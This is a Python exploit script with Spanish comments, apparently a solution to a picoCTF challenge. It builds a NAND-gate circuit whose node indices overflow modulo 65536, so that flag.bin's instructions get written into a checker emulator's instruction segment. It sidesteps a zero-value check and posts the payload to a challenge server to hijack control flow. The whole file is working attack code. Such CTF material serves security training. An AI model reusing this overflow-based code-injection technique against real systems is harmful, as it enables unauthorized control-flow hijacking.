import struct
import requests

try:
    with open('programs/flag.bin', 'rb') as f:
        flag_bin = f.read()
except FileNotFoundError:
    print("Error: flag.bin no encontrado. Ejecuta el script desde la carpeta del reto.")
    exit(1)

# Extraer las palabras de flag.bin
words = struct.unpack(f'<{len(flag_bin)//2}H', flag_bin)

circuit = []
node_id = 2048 

# Vamos a escribir las instrucciones de flag.bin en la zona exacta donde
# nand_checker.bin procesa el bucle de eventos.
# Usamos un rango controlado de palabras para evitar romper el inicio de la máquina (0x0000)
for i in range(len(words)):
    val = words[i]
    
    # Mapeo exacto por desbordamiento al segmento de instrucciones (0x0010 - 0x0040)
    target_node = (65536 - 2048 + 16 + i) % 65536
    
    dummy_node = 30000 + i * 2
    temp_node  = 30000 + i * 2 + 1
    
    if val == 0:
        # Bypass para checkInt (0 no permitido) -> leemos del nodo 640 (vacío de la RAM)
        circuit.append({"input1": 1, "input2": 1, "output": dummy_node})
        val_node = 640 
    else:
        circuit.append({"input1": val, "input2": val, "output": dummy_node})
        val_node = node_id
        
    node_id += 3
    
    circuit.append({"input1": val_node, "input2": val_node, "output": temp_node})
    node_id += 3
    
    circuit.append({"input1": temp_node, "input2": temp_node, "output": target_node})
    node_id += 3

print(f"[*] Payload de precisión con {len(circuit)} compuertas generado.")
print("[*] Lanzando exploit de secuestro de flujo...")

url = "http://activist-birds.picoctf.net:53090/check"
response = requests.post(url, json={"circuit": circuit})

if response.status_code == 200:
    res_json = response.json()
    print("[*] ¡Respuesta recibida con éxito!")
    print(res_json)
else:
    print(f"[!] Error del servidor {response.status_code}:")
    print(response.text)
